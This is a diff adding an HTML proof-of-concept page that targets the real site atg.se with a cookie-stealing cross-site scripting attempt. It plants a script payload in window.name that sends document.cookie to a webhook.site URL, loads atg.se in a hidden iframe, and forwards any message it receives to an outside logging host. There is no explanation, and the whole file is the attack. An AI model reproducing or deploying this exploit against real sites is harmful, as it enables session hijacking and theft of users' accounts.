@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head><title>PoC</title></head>
+  <body>
+    <h1>Loading…</h1>
+
+    <script>
+      // Set a malicious window.name
+      const payload = `<script>fetch('https://webhook.site/eef7ef2d-c300-4fb6-a4f5-945a74a36ff6?c=' + document.cookie)</script>`;
+      window.name = payload;
+
+      // Load ATG inside sandboxed iframe
+      const iframe = document.createElement("iframe");
+      iframe.sandbox = "allow-scripts allow-same-origin";
+      iframe.src = "https://www.atg.se/";
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+
+      // Listen for cookie steal via postMessage from iframe (if it sends anything)
+      window.addEventListener("message", function (e) {
+        fetch("https://your-webhook.com/log?msg=" + encodeURIComponent(e.data));
+      });
+    </script>
+  </body>
+</html>
